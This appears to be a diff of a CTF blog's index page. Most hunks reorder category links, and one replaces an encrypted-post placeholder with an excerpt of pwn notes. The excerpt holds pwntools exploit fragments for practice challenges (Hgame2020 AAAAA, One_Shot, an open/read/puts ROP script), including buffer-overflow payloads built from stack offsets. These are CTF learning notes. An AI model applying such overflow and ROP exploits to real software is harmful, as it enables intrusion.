@@ -287,9 +287,9 @@ from pwn </div>
           
             <a href="/categories/CTF">CTF</a>&nbsp;
           
-            <a href="/categories/buu">buu</a>&nbsp;
-          
             <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
           &nbsp;
         
         
@@ -306,10 +306,29 @@ from pwn </div>
         
         
           
-          
         
-        <div class="index-excerpt" style="max-height: none;">
-          <div class="index-text mb-1">The article has been encrypted, please enter your password to view....</div>
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">Hgame2020Hard_AAAAA
+
+V5在-0x31，s在-0xAC
+sh.recvuntil(&quot;Let&#39;s 0O0o\\0O0!&quot;)
+payload=&quot;a&quot;*(0xAC - 0x31)
+payload += &#39;0O0o\x00O0&#39;
+sh.send(payload)
+sh.interactive()
+One_Shot
+
+0xE0 - 0xC0之后刚好是32位，这样第
+payload = cyclic(0xE0 - 0xC0)
+sh.send(payload)
+sh.recvuntil(&quot;shot!\n&quot;)
+payload = str(6295776)
+sh.send(payload)
+ROP_LEVEL0open_read_puts# -*- coding: utf-8 -*-
+from pwn import *
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+elf = ELF(&#39;./ROP_LEVE</div>
         </div>
       </a>
 
@@ -362,9 +381,9 @@ r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会�
           
             <a href="/categories/CTF">CTF</a>&nbsp;
           
-            <a href="/categories/buu">buu</a>&nbsp;
-          
             <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
           &nbsp;
         
         
@@ -409,9 +428,9 @@ p += p</div>
           
             <a href="/categories/CTF">CTF</a>&nbsp;
           
-            <a href="/categories/buu">buu</a>&nbsp;
-          
             <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
           &nbsp;
         
         
